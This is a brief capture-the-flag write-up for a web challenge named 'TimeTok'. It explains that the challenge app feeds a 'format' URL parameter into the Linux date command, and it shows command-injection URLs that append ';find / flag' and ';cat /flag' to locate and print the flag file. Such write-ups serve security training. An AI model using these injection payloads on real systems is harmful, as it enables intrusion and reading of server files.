# TimeTok

**Category**: Web

**Points**: 225pts

**TL;DR:** inject Linux commands in the requests parameters to search for and print the flag. 💉🐧💲🔍🚩

**Sources**:  [sources_web_timetok.zip](./sources_web_timetok.zip)

**Solution:**
Checking the sources given with the challenge we noticed two things:
- 1) A flag file.
- 2) The date printed in the app was coming from the ***Linux's date command and the format in the request's parameter***. Ex: 

	 http://161.35.170.145:32055/?format=%H:%M:%S

Knowing that, we concatenated our own commands right after the date command. First to search for the flag file and then to print its content.

	http://161.35.170.145:32055/?format=';find / flag'

	http://161.35.170.145:32055/?format=';cat /flag'
